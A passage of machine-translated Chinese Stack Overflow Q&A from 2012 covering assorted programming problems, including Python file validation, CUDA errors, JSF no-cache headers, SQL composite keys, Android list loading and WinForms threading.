这不是检测循环循环的最快或最有效的方法，但它是最简单的，如果您的循环通常很小，它比存储过去路线的历史列表更容易（在某些情况下需要对代码进行重大更改）。当循环长度超过 20 步时，可以使用更有效的算法（它们旨在处理复杂的分支树等）。重要的是要认识到这种实现的最坏情况将是质数的循环元素。

但是您可以通过进一步扩展它来提高平均性能，使其具有一个`Z`每三个`X`步骤执行一次的迭代器，此时实际上不值得添加一个每 5`X`步或 7 步执行一次的额外迭代器，依此类推（访问下一个增量质数与每个新迭代器的创建）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-25T23:43:40.430

也许我不明白你在那里做什么，但对我来说，问题似乎是因为 Ping 任务没有像外部任务那样遵循入队/出队规则。那么让 Ping 任务先出队一个连接，刷新它的“ping 值”，然后再入队呢？

如果您的目标是确保外部任务始终获得具有最小 ping 值的连接，那么您可能希望使用堆而不是队列。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-24T21:33:17.737

您的 ping 是只 ping 每台机器，还是 ping 一台机器，哪台 ping 下一台，哪台 ping 下一台，然后以此类推？

解决这个问题的一种方法是让每台机器跟踪它是否已经被 ping。如果是这样，并且它接收到新的 ping，则不会再次发送 ping。

解决此问题的另一种方法是传递有关给定 ping 数据包已经看到的机器的信息，并且当 ping 数据包到达已经看到的机器时，它会终止。

# activex - ActiveX 控件不会自动更新

> ID：10305697
> 
> 赞同：3
> 
> 时间：2012-04-24T20:42:22.237
> 
> 标签：activex

如何让 ActiveX 控件在客户端计算机上自动更新？

首先，为了让客户端第一次安装 ActiveX，用户需要“以管理员身份”运行 IE（如果在 Windows 7 中），这将正确安装组件。如果 ActiveX 有更新，我将 cab 文件替换为新版本。这将使用与网站相同的服务器上的浏览器更新 ActiveX。但任何其他计算机它都不会更新 ActiveX 控件。

我怎样才能让它工作？

# python - 如果不为真则返回错误（python）

> ID：10305699
> 
> 赞同：0
> 
> 时间：2012-04-24T20:42:29.803
> 
> 标签：python, regex, command-line, formatting

对于我的函数，我有一个给定输入文件的规则列表。如果在给定的文件中违反了其中任何一个，我希望我的程序返回错误消息并退出。

*   第一行应以“#”符号开头（表示标题行）
*   每行应该正好有 10 列
*   第 2 列（从 0 开始计数）应该是 + 或 - 符号
*   第 8 列应该是一个以逗号分隔的整数列表
*   第 9 列应该是一个以逗号分隔的整数列表，整数个数与第 8 列完全相同。

为了尝试做到这一点，我编写了以下代码：

**将史蒂夫哈的答案编辑成代码**

```
with open(infile, 'r') as fp:
line = fp.readline().strip()
if not line.startswith('#'):
    print ('First line does not start with #')
    sys.exit(1)
n = 1
for line in fp.readlines():
    d = '(\d+,\d+)'
    n += 1
    cols = line.strip().split()
    i = search(d, line)
    if len(cols) != 10:
        print('Lenth not equal to 10')
        sys.exit(1)
    if cols[2] != '+' or '-':
        print('Column 2 is not a + or - symbol')
        sys.exit(1)
    if i and cols[8] != i.group(1):
        print('Column 8 is not a comma-separated list of integers')
        sys.exit(1)
    if i and cols[9] != i.group(1) and len(cols[9]) != len(cols[8]):
        print('Column 9 in not a comma-separated list of integers with the exact same number of integers in column 8')
        sys.exit(1) 
```

然而，当我运行它时，并不是所有的条件似乎都是有效的。我正在尝试正确地做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-24T20:45:58.433

这一行是错误的：

```
if cols[2] != '+' or '-': 
```

这是正确的：

```
if not (cols[2] == '+' or cols[2] =='-'): 
```

我建议这样做：

```
if cols[2] not in ('+', '-'): 
```

另外，我建议你不要打电话`fp.readlines()`。文件对象`fp`作为一个迭代器工作，当你迭代它时，你一次得到一行。所以你的循环会变成：

```
for line in fp: 
```

另外，看起来`n`正在跟踪行号？在这种情况下，有一种惯用的 Python 方式可以做到这一点，如下所示：

```
for n, line in enumerate(fp, 1): 
```

`enumerate()`接受一个迭代器并从迭代器返回下一个值以及一个递增的计数。默认情况下，计数从 0 开始，但您可以选择指定一个起始数字，就像我在此处所做的那样使其从 1 开始。

在 Python 中使用`with`语句打开文件是最佳实践，所以我建议你这样做：

```
with open(infile, 'r') as fp:
    line = fp.readline().strip()
    if not line.startswith('#'):
        print ('First line does not start with #')
        sys.exit(1)
    for line in fp:
        # process lines here 
```

您显示的代码对我来说并不完全有意义。这一行：

```
i = search(d, line) 
```

您必须已经执行了`from re import search`命令。我实际上建议只是做`import re`然后明确调用`re.search()`，但我想这是一个偏好问题。无论如何，这将设置`i`为匹配组的结果`re.search()`（或者`None`如果匹配失败）。但是稍后在您正在测试的代码中，`r`而不是`i`，并且您从未`r`在我们在这里看到的任何代码中设置，所以我不确定那会做什么。我个人将`m`其用作匹配组的变量名。

您的正则表达式只匹配一对正整数。没有什么可以计算有多少整数。 `len(cols[8])`正在检查 中有多少个字符`cols[8]`。

您正在调用一个字符串方法函数`.split('')`，这是不正确的。在我的系统上，它引发了一个例外：只需在空白处`ValueError: empty separator` 调用拆分；`.split()`我假设逗号分隔的整数列表不能有任何空格。

最后，请考虑 PEP 8 中的指南。您的变量`FirstLine`像类名一样大写，而不是变量名；这并没有完全让我感到困惑，但它有点让人分心。大多数 Python 社区都遵循 PEP 8。

[http://www.python.org/dev/peps/pep-0008/](http://www.python.org/dev/peps/pep-0008/)

考虑到以上所有因素，我只是重新编写了您的代码：

```
import sys

def parse_list_of_int(s):
    try:
        return [int(x) for x in s.split(',')]
    except Exception:
        return None

with open("test.txt", 'r') as f:
    # read line 1
    line = f.readline().strip()
    if not line.startswith('#'):
        print ('First line does not start with #')
        sys.exit(1)

    # need to start enumerate() at 2 because we pulled line 1 out above
    for i, line in enumerate(f, 2):
        cols = line.strip().split()
        if len(cols) != 10:
            print('line {0}: Length not equal to 10'.format(i))
            sys.exit(1)
        if cols[2] not in ('+', '-'):
            print('line {0}: Column 2 is not a + or - symbol'.format(i))
            sys.exit(1)
        lst8 = parse_list_of_int(cols[8])
        if lst8 is None:
            print('line {0}: Column 8 is not a comma-separated list of integers').format(i)
            sys.exit(1)
        lst9 = parse_list_of_int(cols[9])
        if lst9 is None:
            print('line {0}: Column 9 is not a comma-separated list of integers'.format(i))
            sys.exit(1)
        if len(lst8) != len(lst9):
            print('line {0}: Column 8 and column 9 do not have same number of integers'.format(i))
            sys.exit(1)

print('No problems!')
sys.exit(0) 
```

我编写了一个简单的函数来解析整数列表，构建一个 Python 列表并返回它。然后代码实际上可以正确检查两个列表是否相同长度。

# objective-c - 使用 initWithContentsOfFile 将 NSURL * 发送到 NSString * 类型的参数时出错：

> ID：10305701
> 
> 赞同：0
> 
> 时间：2012-04-24T20:42:43.443
> 
> 标签：objective-c, cocoa-touch, nsstring, runtime-error

我收到错误

> “不兼容的指针类型将'NSURL *'发送到'NSString *'类型的参数

打电话时`initWithContentsOfFile:usedEncoding:error:`

```
- (NSMutableArray *)qBlock{
    NSURL *url = [[NSURL alloc] initWithString:@"http://addressToPath.php"];
    NSError *error = nil;
    NSStringEncoding encoding;
    NSString *response = [[NSString alloc] initWithContentsOfFile:url 
                                                     usedEncoding:&encoding 
                                                            error:&error];
    const char *convert = [response UTF8String];
    NSString *responseString = [NSString stringWithUTF8String:convert];
    NSMutableArray *sample = [responseString JSONValue];

    return sample;

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-24T20:45:32.237

`initWithContentsOfFile:encoding:error:`接收 a`NSString *`作为文件路径，而不是`NSURL *`. 您需要致电`initWithContentsOfURL:encoding:error:`：

```
NSString *response = [[NSString alloc] initWithContentsOfURL:url 
                                             usedEncoding:&encoding 
                                                    error:&error]; 
```

# ruby-on-rails - 是否有一个函数可以检查会话是否不为空并且等于 Ruby on Rails 中的某个变量？

> ID：10305702
> 
> 赞同：2
> 
> 时间：2012-04-24T20:42:49.150
> 
> 标签：ruby-on-rails

现在在我的代码中，我正在尝试检查是否存在特定的会话键/值，如果存在，请执行某些操作。有没有办法一次完成所有这些而不是多个 if 语句？

这是我的 if 语句：

```
if session[:mysession] %>
  if session[:mysession][:cats] != "fluffy" %>
    #do something
  end
end 
```

执行此操作时出现 nil 错误：

```
if session[:mysession][:cats] == "fluffy"
  #do something
end 
```

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-24T21:27:20.717

(1)

```
if session[:mysession] && (session[:mysession][:cats] != "fluffy") 
```

(2) (当有很多代码引用 session[:mysession] 时特别好)

```
session[:mysession] ||= {}
if session[:mysession][:cats] != "fluffy" 
```

(3)

```
if session.fetch(:mysession, {})[:cats] != "fluffy" 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-24T20:57:09.330

你可以使用 try 函数。当调用 nil 时，它将默默地返回 nil。您将“尝试”使用您的密钥作为参数调用 [] 方法

```
if session[:mysession].try(:[], :cats) == "fluffy"
    #do something
end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-24T20:59:29.050

尝试这个。

```
 session['cats'] = Hash.new if session['cats'] == nil
 // do something
 @cat_session = session['cats'] 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-24T20:50:15.877

尝试：

```
if Hash(session[:mysession])[:cats] == "fluffy"
  % do something
end 
```

从理论上讲，它会尝试将您的会话变量转换为哈希，并获取其值。

# cuda - 使用 cudaMemcpy 时出现奇怪的错误：cudaErrorLaunchFailure

> ID：10305715
> 
> 赞同：5
> 
> 时间：2012-04-24T20:43:32.423
> 
> 标签：cuda, gpu

我有一个 CUDA 代码，如下所示：

```
cpyDataGPU --> CPU     

while(nsteps){

    cudaKernel1<<<,>>>
    function1();    
    cudaKernel2<<<,>>>

}

cpyDataGPU --> CPU 
```

* * *

而function1是这样的：

```
function1{

    cudaKernel3<<<,>>>
    cudaKernel4<<<,>>>

    cpyNewNeedDataCPU --> GPU   // Error line
    cudaKernel5<<<,>>>
} 
```

根据[cudaMemcpy 文档](http://www.clear.rice.edu/comp422/resources/cuda/html/group__CUDART__MEMORY_g48efa06b81cc031b2aa6fdc2e9930741.html)，此函数可以产生 4 个不同的错误代码：“cudaSuccess”、“cudaErrorInvalidValue”、“cudaErrorInvalidDevicePointer”和“cudaErrorInvalidMemcpyDirection”。

但是，我收到以下错误：“cudaErrorLaunchFailure”：“执行内核时设备发生异常。常见原因包括取消引用无效设备指针和访问越界共享内存。在调用 cudaThreadExit() 之前无法使用该设备. 所有现有的设备内存分配都是无效的，如果程序要继续使用 CUDA，必须重新构建。”

有没有人知道我为什么会收到这个错误¿？我究竟做错了什么？

在先前的内核调用之后复制数据 CPU-> GPU 是否有意义¿？问题是，我必须在每个步骤中复制该数据，因为它可能会在每个“while”步骤中发生变化。

提前谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-25T10:20:53.110

您链接的文档还说：

> 请注意，此函数还可能从以前的异步启动返回错误代码。

当您调用`cudaMemcpy()`程序时，将等待所有前面的 GPU 工作完成（记住内核启动是异步的），然后检查状态并在一切正常时执行 memcpy。但是，在这种情况下，您的一个内核失败了。

此错误的最常见原因是越界访问，很像 x86 领域中的段错误。

> cudaErrorLaunchFailure ：执行内核时设备发生异常。常见原因包括取消引用无效的设备指针和访问越界共享内存。在调用 cudaThreadExit() 之前无法使用该设备。如果程序要继续使用 CUDA，所有现有的设备内存分配都是无效的，必须重新构建。

The easiest way to debug this would be to use cuda-memcheck. Alternatively you can identify which kernel failed by calling `cudaDeviceSynchronize()` after each kernel launch and checking the return value.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-24T20:51:53.500

您是否在调用内核后检查错误状态？因为（几乎？）所有 cuda 调用都可能从​​先前失败的调用或内核返回错误。由于您遇到启动失败，我怀疑副本之前的内核之一是错误的真正来源。

# php - 函数中的 PHP 奇怪行为：根据英文/西里尔文显示/不显示文本。为什么？

> ID：10305717
> 
> 赞同：0
> 
> 时间：2012-04-24T20:43:35.060
> 
> 标签：php, function

有两个文件 run.php 和 class/functions.php 用于在 javascript 事件的 html 页面上放置一些文本（AJAX 用于此）。

run.php 文件是：

```
<?php
mb_internal_encoding("UTF-8");

require_once('class/functions.php');

$text = array();
$text[0]="rrrrrr";

strange_func($text, 0);//puts "фа" into $text[0]
$res1=$text[0];

$arr = array();

$arr['res1'] = $res1;
$arr['res2'] = "test";

header('Content-type: application/json');
echo json_encode($arr);
?> 
```

类/functions.php 包含：

```
function strange_func(&$text, $i){
    $text[$i]="hello123";//hello123 will be displayed on html page on javascript event
    //$text[$i]="фь";
    //if we comment hello123 and uncomment фь, then фь will NOT be displayed on the html page on javascript event by unknown reason. Why?
} 
```

此外，如果我替换`require_once('class/functions.php');`为

```
function strange_func(&$text, $i){
    $text[$i]="фь";
} 
```

，然后会显示“фь”。那么，如果文本是西里尔文，为什么函数`strange_func`from`class/functions.php`不显示文本？

上面的代码是简化的结果，没有太多意义。但是，问题依然存在。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:54:31.140

使用 utf-8 编码保存（无 BOM）

# jsf - 避免 JSF Web 应用程序上的后退按钮

> ID：10305718
> 
> 赞同：49
> 
> 时间：2012-04-24T20:43:40.620
> 
> 标签：jsf, browser, back-button

我正在显示非常敏感的数据。用户从我的服务器注销后，我不希望其他用户能够看到点击浏览器的“后退”按钮的数据。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：82
> 
> 时间：2012-04-24T20:50:46.097

默认情况下，浏览器的后退按钮根本不会向服务器发送 HTTP 请求。相反，它从浏览器缓存中检索页面。这本质上是无害的，但确实让最终用户感到困惑，因为他/她错误地认为它确实来自服务器。

您需要做的就是指示浏览器不要缓存受限页面。您可以使用一个简单的 servlet 过滤器来设置[适当的响应标头](https://stackoverflow.com/questions/49547/making-sure-a-web-page-is-not-cached-across-all-browsers)：

```
@WebFilter
public class NoCacheFilter implements Filter {

    @Override
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) res;

        if (!request.getRequestURI().startsWith(request.getContextPath() + ResourceHandler.RESOURCE_IDENTIFIER)) { // Skip JSF resources (CSS/JS/Images/etc)
            response.setHeader("Cache-Control", "no-cache, no-store, must-revalidate"); // HTTP 1.1.
            response.setHeader("Pragma", "no-cache"); // HTTP 1.0.
            response.setDateHeader("Expires", 0); // Proxies.
        }

        chain.doFilter(req, res);
    }

    // ...
} 
```

*（请注意，此过滤器会跳过 JSF 资源请求，[其缓存实际上需要单独配置](https://stackoverflow.com/questions/15057932/jsf-cache-static-resources-filter)）*

要让它在每个 JSF 请求上运行，请在过滤器类上设置以下注释，假设您的 webapp 中`<servlet-name>`的值为：`FacesServlet``web.xml``facesServlet`

```
@WebFilter(servletNames={"facesServlet"}) 
```

或者，要使其仅在特定的 URL 模式上运行，例如与受限页面匹配的模式，例如`/app/*`、`/private/*`、`/secured/*`等，请在过滤器类上设置以下注释：

```
@WebFilter("/app/*") 
```

如果您已经有登录用户，您甚至可以在检查登录用户的过滤器中执行相同的工作。

如果您碰巧使用 JSF 实用程序库[OmniFaces](http://omnifaces.org)，那么您也可以直接获取它的[`CacheControlFilter`](http://showcase.omnifaces.org/filters/CacheControlFilter). 这也透明地考虑了 JSF 资源。

### 也可以看看：

*   [防止用户在注销后看到以前访问过的安全页面](https://stackoverflow.com/questions/4194207/prevent-user-from-going-back-to-the-previous-secured-page-after-logout)
*   [会话到期时的授权重定向不适用于提交 JSF 表单，页面保持不变](https://stackoverflow.com/questions/14580267/authorization-redirect-on-session-expiration-does-not-work-on-submitting-a-jsf-f/)
*   [JSF 2.0 View Scope 后退按钮安全吗？](https://stackoverflow.com/questions/9930900/is-jsf-2-0-view-scope-back-button-safe/)

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-04-25T15:01:37.840

我还找到了另一个很好的解决方案。

在 faces-config.xml 添加

```
<lifecycle>
    <phase-listener id="nocache">client.security.CacheControlPhaseListener</phase-listener>
</lifecycle> 
```

并实现以下类：

```
package client.security;

import javax.faces.context.FacesContext;
import javax.faces.event.PhaseEvent;
import javax.faces.event.PhaseId;
import javax.faces.event.PhaseListener;
import javax.servlet.http.HttpServletResponse;

@SuppressWarnings("serial")
public class CacheControlPhaseListener implements PhaseListener
{
    public PhaseId getPhaseId()
    {
        return PhaseId.RENDER_RESPONSE;
    }

    public void afterPhase(PhaseEvent event)        
    {
    }

    public void beforePhase(PhaseEvent event)
    {
       FacesContext facesContext = event.getFacesContext();
       HttpServletResponse response = (HttpServletResponse) facesContext
                .getExternalContext().getResponse();
       response.addHeader("Pragma", "no-cache");
       response.addHeader("Cache-Control", "no-cache");
       // Stronger according to blog comment below that references HTTP spec
       response.addHeader("Cache-Control", "no-store");
       response.addHeader("Cache-Control", "must-revalidate");
       // some date in the past
       response.addHeader("Expires", "Mon, 8 Aug 2006 10:00:00 GMT");
    }
} 
```

# sql-server - 违反组合键的主键约束

> ID：10305729
> 
> 赞同：1
> 
> 时间：2012-04-24T20:45:23.317
> 
> 标签：sql-server

```
INSERT INTO tbl_AllParcel
           ([P_ID],[Sub_ID],[X_COORD],[Y_COORD])

VALUES 
       ('0706' , '002' , '579002' , '1167176'),
       ('0706' , '003' , '579013' , '1167153') 
```

P_ID 和 Sub_ID 都是主键，它们共同构成一个复合键。我收到以下错误消息，我运行上面的代码。唯一值不应该由复合键单独创建吗？

> 消息 2627，级别 14，状态 1，第 2 行违反主键约束“PK_tbl_Parcel”。无法在对象“dbo.tbl_AllParcel”中插入重复键。该语句已终止。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T21:30:39.000

尝试分别插入两行。我敢打赌至少有一个失败，但不一定两者都失败。失败不是来自仅在插入语句中找到的数据，除非您在各个列上同时具有复合主键/唯一约束和另一个唯一约束。

你也能解释一下你是如何有两个主键一起形成一个复合键的吗？一张表只能有一个主键。您能否编写表定义脚本（在 SSMS 中的对象资源管理器中右键单击，将表编写为，创建到，剪贴板），并将其添加到问题中，以便我们可以就术语达成一致？

*如果您对 P_ID 有唯一约束，对 Sub_ID 有唯一约束，那么表中的每个*值只能有一个，这与我认为您想要的相反（只有组合必须是唯一的）。如果您对各个列有唯一约束，则这是无效的，因为它不违反组合约束，但确实违反了第一列的约束：

```
P_ID Sub_ID
---- ------
0706 002
0706 003 
```

我们可以告诉您如何解决此问题（并确认没有 P_ID = '0706' 且 Sub_ID = '002' 或 '003' 的行）。当你这样说时会发生什么：

```
SELECT COUNT(*) FROM dbo.tbl_AllParcel WHERE P_ID = '0706' AND Sub_ID = '002'; 
```

? 或者更重要的是，我想，这取决于您提供的脚本：

```
SELECT COUNT(*) FROM dbo.tbl_AllParcel WHERE P_ID   = '0706';
SELECT COUNT(*) FROM dbo.tbl_AllParcel WHERE Sub_ID = '002'; 
```

为了在不向单个列添加键的情况下创建复合键，您不要选择单个列。这是一种使用方法`CREATE TABLE`：

```
CREATE TABLE dbo.tbl_AllParcel2
(
  P_Id   CHAR(4),
  Sub_Id CHAR(3),
  ... other columns,
  CONSTRAINT PK_Parcel PRIMARY KEY(P_Id, Sub_Id)
); 
```

我假设您当前正在使用 UI。不要尝试在表格设计器中执行此操作 - 这是一大堆垃圾。学习 DDL，它会让你走得更远。以下是联机丛书中的`CREATE TABLE`和主题，其中有大量用于定义各种约束和其他表属性的示例：`ALTER TABLE`

[创建表 (MSDN)](http://msdn.microsoft.com/en-us/library/ms174979.aspx)
[更改表 (MSDN)](http://msdn.microsoft.com/en-us/library/ms190273.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-24T20:48:15.027

此错误意味着您已经在该复合键的表中获得了这两个之一。

```
'0706' , '002' 
'0706' , '003' 
```

# android - 像在 gmail 中一样在 android 上推送刷新（而不是像在 iphone 上那样拉刷新）

> ID：10305730
> 
> 赞同：2
> 
> 时间：2012-04-24T20:45:25.060
> 
> 标签：android, list, refresh, ui-design

尽管有些人认为这不是一个[很好的 ui 模式](http://android.cyrilmottier.com/?p=598)（我必须说我属于这个阵营） ，但已经有[很多请求](https://stackoverflow.com/questions/4583484/how-to-implement-android-pull-to-refresh)在 android 上刷新[小部件](http://www.youtube.com/watch?v=OnD1vOn-aeo)或[库的请求。](https://github.com/johannilsson/android-pulltorefresh)

但是“拉刷新”或者更准确地说：在 gmail 中用于 android 4 的机制。当你到达列表的底部时，你会得到最后一个元素。但是，如果您再次向上滚动（推），则会出现一个带有无限进度条的新列表项，并且下一封邮件将加载并填满列表。

[其他 android 编码人员和 UI 设计人员已经注意到了这一点](http://www.androidpatterns.com/uap_pattern/dynamic-loading-of-a-list)，但我找不到关于这种模式的任何好的辩论，我也找不到这个功能的实现来填充列表。

有没有人看到这个问题的有趣解决方案？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-15T15:00:46.313

这是两个有用的库：

*   [https://github.com/johannilsson/android-pulltorefresh](https://github.com/johannilsson/android-pulltorefresh)
*   [https://github.com/chrisbanes/Android-PullToRefresh](https://github.com/chrisbanes/Android-PullToRefresh)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-08-18T12:05:15.440

你可以尝试自己实现它。它很容易：

我是怎么做的：

1）设置你的列表视图的onScrollStateChange：

```
@Override
public void onScrollStateChanged(AbsListView listView, int scrollState) {
    if (scrollState == SCROLL_STATE_IDLE) {
        if (listView.getLastVisiblePosition() >= listView.getCount()-1) {
                //scroll reached the end, trigger the method to load more itens!                
        }
    }
} 
```

2）在您的基本适配器中：

```
private static final int TYPE_VIEW_COUNT = 2;
private static final int TYPE_VIEW_CONTENT = 0;
private static final int TYPE_VIEW_LOADING = 1; 

@Override
public int getItemViewType(int position) {

    if (position == (getCount()-1)) {
        return TYPE_VIEW_LOADING;
    } else {
        return TYPE_VIEW_CONTENT;
    }           

}

@Override
public int getViewTypeCount() {
    return TYPE_VIEW_COUNT;
}

@Override
public int getCount() {
    //return list size + 1;
}

@Override
public View getView(int position, View convertView, ViewGroup parent) {

    View view = null;

    switch (getItemViewType(position)) {

    case TYPE_VIEW_CONTENT:

        //load your content view (using convertView and then...)

        break;
    case TYPE_VIEW_LOADING:
        //load your loading view (indeterminate progressbar)
        break;
    }

    return view;        

} 
```

# winforms - 如何从线程设置 ToolStripProgressBar 的值？

> ID：10305734
> 
> 赞同：2
> 
> 时间：2012-04-24T20:45:39.020
> 
> 标签：winforms, multithreading, c++-cli, clr

现在，我知道当大多数人看到这种问题时，他们会想“哦，使用代表”。好吧，*我正在*使用代表。这是迄今为止唯一拒绝与他们合作的控件。我也没有使用 BackgroundWorker。

我为自己编写了一个 System::Threading::Thread 的包装类，因为我知道我会经常使用它们。我为该类提供了各种委托事件，以便它可以与 UI 线程交互。我一直在使用它主要只是为了设置状态栏的状态。我还有一个未使用的进度条，所以我想添加它。我给了它一个委托，但是当我运行它时，它会因臭名昭著而崩溃：

> System.Windows.Forms.dll 中出现“System.InvalidOperationException”类型的未处理异常
> 
> 附加信息：跨线程操作无效：控件''从创建它的线程以外的线程访问。

我现在很困惑，因为据我所知，我使用委托的方式与使用其他控件的方式相同。这一款很特别吗？我已经在互联网上进行了广泛搜索，我得到的只是 C# BackgroundWorker 问题，这些问题并不真正适用于此。这是我的代表的代码：

代表：

```
delegate void               OnThreadProgressUpdateDel(int progress, String^ status); 
```

保存事件的变量：

```
OnThreadProgressUpdateDel^  m_updateProgressEvent; 
```

事件绑定方式：

```
thread->OnThreadProgressUpdate += gcnew ObjectLoadThread::OnThreadProgressUpdateDel(this, &CObjectLoader::ProgressUpdate); 
```

该活动名为：

```
void CObjectLoader::ProgressUpdate(int progress, String^ status)
{
    gGlobal->ProgramProgress->Maximum = 100;
    gGlobal->ProgramProgress->Value = progress; //Crash here...
    gGlobal->SetProgramStatus(status);
} 
```

在这里调用：

```
m_updateProgressEvent->Invoke(1, "Loading objects..."); 
```

这个愚蠢的 ToolStripProgressBar 有什么特别之处，以至于它不想更新:(

在 Microsoft Visual C++ 2008 Express Edition 中使用 C++ CLR，Windows 窗体应用程序。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-18T20:56:44.200

“ToolStripProgressBar 没有 Invoke 方法。”

你是对的；但是 toolStripProgressBar.ProgressBar.Invoke 和 InvokeRequired 确实存在并且按预期运行。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-24T21:02:31.560

Windows 控件希望从创建它们的同一线程进行修改。根据控制和操作，MDA 或 Exception 不会触发，但到目前为止最好遵循标准：

`if(InvokeRequired) control.Invoke();`

处理线程和控件时的模式。

[http://msdn.microsoft.com/en-us/library/ms171728(v=vs.80).aspx](http://msdn.microsoft.com/en-us/library/ms171728(v=vs.80).aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-04-16T15:32:47.847

// 使用下面的代码 Ahmad abbulkmailer.com

```
SetControlPropertyValue1(ProgressBar2, "value", 67);

  delegate void SetControlValueCallback1(ToolStripProgressBar oControl, string propName, object propValue);
        private void SetControlPropertyValue1(ToolStripProgressBar oControl, string propName, object propValue) {
            if (oControl.GetCurrentParent().InvokeRequired) {
                SetControlValueCallback1 d = new SetControlValueCallback1(SetControlPropertyValue1);
                oControl.GetCurrentParent().Invoke(d, new object[] { oControl, propName, propValue });
            }
            else {

                Type t = oControl.GetType();
                PropertyInfo[] props = t.GetProperties();

                foreach (PropertyInfo p in props) {
                    if (p.Name.ToUpper() == propName.ToUpper()) {
                        p.SetValue(oControl, propValue, null);
                    }
                }
            }

        } 
```

# object - SenchaTouch 2 带有自定义模型类的文本字段

> ID：10305742
> 
> 赞同：0
> 
> 时间：2012-04-24T20:46:06.297
> 
> 标签：object, custom-controls, sencha-touch-2

我是 Sencha Touch 2 的新手。我正在尝试使用自定义模型创建文本字段：

```
Ext.define('EGenDocMobile.custom.Polje', {
    extend: 'Ext.data.Model',
    config: {
        title:'Value',
        idProperty: 'Value',
        fields: [
            { name: 'Visible', type: 'boolean' },
            { name: 'Value', type: 'string' }
         ]
    }
}); 
```

从 ext.list 获取我的数据，并传递给另一个视图，现在我正在尝试在字段中使用值字符串

```
{
    xtype: 'textfield',
    name: '{FirstField.Value}',
    label: 'Ključ interna',
    readOnly: true
} 
```

不能以这种方式使用它......唯一的一半工作方法是如果我使用 `name: 'FirstField',`

但随后，texfields 获得价值：`[object Object]`

调用什么来获取 object.Value？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T21:36:24.260

没有办法动态地做到这一点。您需要获取模型的实例（称为*记录*），然后使用它来更新字段。

```
var field = Ext.create('Ext.field.Text', {
    name: record.get('Value')
}); 
```

或者如果该字段已经存在：

```
field.setName(record.get('Value')); 
```

# sql - SQL Server - 按日期部分周排序

> ID：10305749
> 
> 赞同：1
> 
> 时间：2012-04-24T20:46:34.783
> 
> 标签：sql, sql-server

我正在使用 SQL Server。当我尝试使用 datepart 函数按周对信息进行排序时，它不返回任何值。我的表中有所选日期范围的值。

我尝试使用的查询是：

```
Declare @StartDate datetime, @EndDate datetime
set @StartDate = '20120401 00:00:00'
set @EndDate = '20120430 23:59:59'
;WITH
mytablePlusHours As
(
SELECT *,
    DATEPART(ww, [eci_date])     AS [dateWeek]
FROM    [mytable]    
)
, mytableHourGroups As
(
SELECT  dateWeek, 
        [eci_country],
        COUNT(*)        As [Number_Country],
        ROW_NUMBER() OVER(PARTITION BY dateWeek ORDER BY [eci_country])
                        As [Country_Rank]
FROM        mytablePlusHours
GROUP BY    dateWeek, [eci_country]
)
SELECT  
    dateWeek     AS [eci_date],
    [eci_country],
    [Number_Country]
FROM    mytableHourGroups WITH(NOLOCK)
WHERE   [dateWeek] between @StartDate and @EndDate
ORDER BY [dateWeek], [Number_Country] DESC 
```

我可以按天提取信息，但我不知道如何按周对其进行排序。有人可以告诉我我的代码哪里错了吗？谢谢！

我正在尝试显示我的数据，例如：

```
Week Country       Count
16   United States  13
17   Canada         41 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-24T20:51:41.460

`[DateWeek]`不是日期，它是一个数字（1 到 53）。

任何一个...

将该`WHERE`子句移至您的第一个 CTE。

```
mytablePlusHours As
(
  SELECT *, DATEPART(ww, [eci_date])     AS [dateWeek]
    FROM [mytable]
   WHERE [eci_date] between @StartDate and @EndDate
) 
```

或者，将 更改为`DATEPART()`返回日期的函数...

```
mytablePlusHours As
(
  SELECT *, DATEADD(WEEK, DATEDIFF(WEEK, 0, [eci_date]), 0) AS [dateWeek]
    FROM [mytable]
) 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-24T20:50:55.093

您正在将整数与日期进行比较。

`DATEPART(ww...)`返回数字周（即一年中的第三周为 3）。您的比较`datetime`是不可直接比较的。

您需要与日期的星期进行比较，还应该检查年份。只检查一周：

```
WHERE   [dateWeek] between  DATEPART(ww,@StartDate) and DATEPART(ww,@EndDate) 
```

您应该将年份添加到您的 CTE 并进行比较，否则 2012 年 1 月 15 日和 2011 年 1 月 9 日都将出现在同一个“周”中。

# javascript - 当我将变量附加到 url 时，如何使 .load 工作？

> ID：10305751
> 
> 赞同：1
> 
> 时间：2012-04-24T20:46:55.420
> 
> 标签：javascript, jquery

我想将单击的 href 附加到我的 .load 方法的 url 字符串中，并加载到我调用的页面的特定部分，不幸的是，当我附加变量时，很多元素似乎在我的页面上重复？

基本上我希望我的 .load 方法看起来像 .load('http://localhost/folio1.html #inner');

但我当前的代码加载到所有 folio1.html 页面中：

来自对象 wcd 的片段：

```
instance.selectors.banner.load('http://localhost/'+url+'#inner');

$('a').on('click', function(e){
    var url = $(this).attr('href');
    wcd.toggleBanner(url);

    e.preventDefault();
  }); 
```

有人可以建议我如何将 url 变量附加到 .load url 并仅检索 #inner 中的内容吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-24T20:48:45.130

您似乎缺少一个空格：

```
